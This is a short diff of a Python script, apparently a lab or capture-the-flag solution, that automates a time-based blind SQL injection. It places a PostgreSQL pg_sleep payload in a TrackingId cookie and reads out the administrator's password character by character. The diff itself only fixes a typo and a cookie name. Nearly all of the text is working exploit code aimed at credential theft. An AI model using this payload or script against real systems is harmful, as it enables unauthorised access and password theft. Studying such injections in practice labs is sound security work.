@@ -67,12 +67,12 @@ def MakeSQLI():
     p2 = log.progress("Password")
 
     for position in range(1, 21):
-	    for character in characteres:
+	    for character in characters:
 		    cookies = {
-			    "TrackingID": "valor ' %3b select case when(username='administrator' and substring(password,%d,1)='%s') then pg_sleep(2) else pg_sleep(0) end from users -- -" % (position, character),
+			    "TrackingId": "valor ' %3b select case when(username='administrator' and substring(password,%d,1)='%s') then pg_sleep(2) else pg_sleep(0) end from users -- -" % (position, character),
 			    "session": "valor"           # El valor se obtiene de Burpsuite
 		    }
-		    p1.status(cookies['TrackingID'])
+		    p1.status(cookies['TrackingId'])
               time_start = time.time()
               r = requests.get(main_url, cookies=cookies)
               time_end = time.time()
